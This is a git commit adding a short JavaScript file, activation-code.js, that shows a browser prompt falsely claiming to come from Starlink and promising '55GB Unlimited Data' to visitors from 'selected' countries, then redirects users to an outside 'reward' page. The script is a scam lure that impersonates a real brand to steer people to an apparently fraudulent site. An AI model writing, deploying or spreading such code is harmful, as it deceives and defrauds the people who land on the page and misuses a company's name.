298568831401387d44830a65305fd4981c991752
ekpanewblog5 <ukpehaitid3@gmail.com>
2026-03-14 01:11:42 -0700

    Create activation-code.js

---
+++ activation-code.js
@@ -0,0 +1,5 @@
+var password = 'CODE: 1971'
+password=prompt('STARLINK: Congratulations, Your country is among the selected ones to benefit from Starlink Satellite Click Ok to Activate 55GB Unlimited Data','CODE: 1971');
+if (password != 'CODE: 1971') {
+location.href='https://gbamz.com/rward.html';
+}
